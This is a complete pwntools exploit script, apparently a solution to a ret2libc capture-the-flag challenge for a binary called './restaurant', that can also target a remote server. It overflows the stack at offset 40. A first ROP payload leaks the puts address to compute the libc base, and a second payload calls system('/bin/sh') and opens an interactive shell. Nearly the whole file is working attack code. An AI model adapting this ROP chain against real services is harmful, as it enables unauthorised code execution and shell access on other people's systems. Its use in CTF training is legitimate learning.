# ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
break main
break fill
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './restaurant'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP
offset = 40

# Start program
io = start()

# libc_addr = 0x00007ffff7dbd000
# # readelf -s ./libc.so.6 | grep system
# system_addr = libc_addr + 0x52290

# # strings -a -t x ./libc.so.6 | grep /bin/sh
# bin_sh = libc_addr + 0x1b45bd

pop_rdi = 0x4010a3
ret = 0x40063e


# Leak got.puts address

payload1 = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.puts,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.fill  # Return to vulnerable function (to overflow buffer with another payload)
    ]
})








io.sendlineafter(b'> ', "1")
io.recvline(5)

# Send the payload
io.sendlineafter(b'> ',payload1)

info(io.recvuntil(b"\n"))

got_puts = u64(io.recvuntil(b'\x7f\n')[-7:-1].ljust(8, b"\x00"))
info("leaked got_read: %#x", got_puts)

libc_base = got_puts - 0x80aa0
info("libc base: %#x", libc_base)

system_addr = libc_base + 0x4f550
info("system: %#x", system_addr)

bin_sh = libc_base + 0x1b3e1a
info("bin: %#x", bin_sh)





# Payload to get shell: system('/bin/sh')
payload2 = flat(
    asm('nop')*offset,
    pop_rdi,
    bin_sh,
    ret,
    system_addr
)

io.sendlineafter(b'> ',payload2)


io.recvline(5)
io.interactive()
